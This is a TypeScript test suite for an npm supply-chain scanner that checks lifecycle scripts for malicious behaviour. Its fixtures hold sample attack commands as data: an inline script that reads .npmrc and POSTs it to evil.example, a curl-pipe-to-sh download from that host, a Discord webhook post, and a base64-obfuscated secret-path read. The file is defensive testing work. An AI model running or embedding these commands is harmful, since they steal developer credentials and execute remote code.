// SPDX-License-Identifier: MIT
import { describe, expect, test } from "bun:test";
import { mkdtempSync, mkdirSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { analyzeInstalledAst } from "../src/ast/orchestrate";
import { scanNodeModules } from "../src/inventory";
import { scriptSha256 } from "../src/corpus/allowlist";

function tmp(): string {
  return mkdtempSync(join(tmpdir(), "wg-orch-"));
}

function makeNodeModule(
  root: string,
  name: string,
  scripts: Record<string, string>,
  files: Record<string, string> = {},
): void {
  const dir = name.startsWith("@")
    ? join(root, "node_modules", ...name.split("/"))
    : join(root, "node_modules", name);
  mkdirSync(dir, { recursive: true });
  writeFileSync(
    join(dir, "package.json"),
    JSON.stringify({ name, version: "1.0.0", scripts }, null, 2),
  );
  for (const [rel, content] of Object.entries(files)) {
    const p = join(dir, rel);
    mkdirSync(join(p, ".."), { recursive: true });
    writeFileSync(p, content);
  }
}

describe("orchestrate: end-to-end AST + IoC + allowlist", () => {
  test("benign package with no lifecycle scripts: zero findings", () => {
    const root = tmp();
    makeNodeModule(root, "lodash", {});
    const installed = scanNodeModules(root);
    const r = analyzeInstalledAst(installed);
    expect(r.findings.length).toBe(0);
  });

  test("malicious inline node -e with secret-path + fetch: emits high+ taint findings", () => {
    const root = tmp();
    makeNodeModule(root, "evil-pkg", {
      postinstall: `node -e "const fs=require('fs');const data=fs.readFileSync('/home/x/.npmrc');fetch('https://evil.example/x',{method:'POST',body:data})"`,
    });
    const installed = scanNodeModules(root);
    const r = analyzeInstalledAst(installed);
    const ids = r.findings.map((f) => f.ruleId);
    expect(ids).toContain("WG-AST-FETCH");
    expect(ids).toContain("WG-AST-SECRET-PATH");
    // taint should escalate fetch from high to critical
    const fetchHit = r.findings.find((f) => f.ruleId === "WG-AST-FETCH");
    expect(fetchHit?.severity).toBe("critical");
  });

  test("anti-evasion: string-concat require still detected", () => {
    const root = tmp();
    makeNodeModule(root, "concat-evader", {
      postinstall: `node -e "require('ht'+'tps').get('https://evil')"`,
    });
    const installed = scanNodeModules(root);
    const r = analyzeInstalledAst(installed);
    expect(r.findings.some((f) => f.ruleId === "WG-AST-NETWORK-BUILTIN")).toBe(true);
  });

  test("known-good fingerprint suppresses findings", () => {
    const root = tmp();
    const customBody = "echo hello";
    makeNodeModule(root, "my-internal-pkg", { postinstall: customBody });
    const installed = scanNodeModules(root);
    const r = analyzeInstalledAst(installed, {
      scriptFingerprints: { "my-internal-pkg": [scriptSha256(customBody)] },
    });
    // Should be allowlisted; expect WG-INSTALL-SCRIPT-ALLOWLISTED, no high/critical AST.
    expect(r.findings.some((f) => f.ruleId === "WG-INSTALL-SCRIPT-ALLOWLISTED")).toBe(true);
    expect(r.findings.some((f) => f.severity === "critical")).toBe(false);
    expect(r.findings.some((f) => f.severity === "high")).toBe(false);
  });

  test("fingerprint drift: known package with unknown body emits CRITICAL drift finding", () => {
    const root = tmp();
    // 'esbuild' is in the bundled allowlist with a known set of hashes.
    makeNodeModule(root, "esbuild", { postinstall: "node evil-replacement.js" });
    const installed = scanNodeModules(root);
    const r = analyzeInstalledAst(installed);
    expect(r.findings.some((f) => f.ruleId === "WG-SCRIPT-FINGERPRINT-DRIFT")).toBe(true);
    const drift = r.findings.find((f) => f.ruleId === "WG-SCRIPT-FINGERPRINT-DRIFT");
    expect(drift?.severity).toBe("critical");
  });

  test("WG-IOC-DOMAIN: discord webhook URL in script source flags critical", () => {
    const root = tmp();
    makeNodeModule(
      root,
      "exfil-pkg",
      { postinstall: "node ./post.js" },
      {
        "post.js": `fetch("https://discord.com/api/webhooks/123/abc", {method:"POST"})`,
      },
    );
    const installed = scanNodeModules(root);
    const r = analyzeInstalledAst(installed);
    expect(r.findings.some((f) => f.ruleId === "WG-IOC-DOMAIN")).toBe(true);
  });

  test("base64-encoded secret-path is decoded and re-flagged", () => {
    const root = tmp();
    const b64 = Buffer.from("/home/x/.npmrc").toString("base64");
    makeNodeModule(
      root,
      "obf-pkg",
      { postinstall: "node ./obf.js" },
      {
        "obf.js": `const p = Buffer.from('${b64}','base64').toString(); require('fs').readFileSync(p);`,
      },
    );
    const installed = scanNodeModules(root);
    const r = analyzeInstalledAst(installed);
    expect(r.findings.some((f) => f.ruleId === "WG-AST-BASE64")).toBe(true);
    expect(r.findings.some((f) => f.ruleId === "WG-AST-SECRET-PATH")).toBe(true);
  });

  test("WG-SHELL-PIPE: curl|sh in postinstall flags critical", () => {
    const root = tmp();
    makeNodeModule(root, "shell-attack", { postinstall: "curl https://evil.example/x | sh" });
    const installed = scanNodeModules(root);
    const r = analyzeInstalledAst(installed);
    expect(r.findings.some((f) => f.ruleId === "WG-SHELL-PIPE")).toBe(true);
    expect(r.findings.find((f) => f.ruleId === "WG-SHELL-PIPE")?.severity).toBe("critical");
  });

  test("benign tsc -b prepare: low-only advisory, no high/critical", () => {
    const root = tmp();
    makeNodeModule(root, "my-lib", { prepare: "tsc -b" });
    const installed = scanNodeModules(root);
    const r = analyzeInstalledAst(installed);
    expect(r.findings.some((f) => f.severity === "high" || f.severity === "critical")).toBe(false);
  });

  test("AST parse failure on malformed JS still emits parse-failed advisory", () => {
    const root = tmp();
    makeNodeModule(
      root,
      "broken-syntax",
      { postinstall: "node ./broken.js" },
      { "broken.js": `this is { not valid javascript ;; eval('x'); fetch('y')` },
    );
    const installed = scanNodeModules(root);
    const r = analyzeInstalledAst(installed);
    expect(r.findings.some((f) => f.ruleId === "WG-AST-PARSE-FAILED")).toBe(true);
    // Critical evidence still surfaces via regex fallback.
    expect(r.findings.some((f) => f.ruleId === "WG-AST-EVAL")).toBe(true);
  });
});
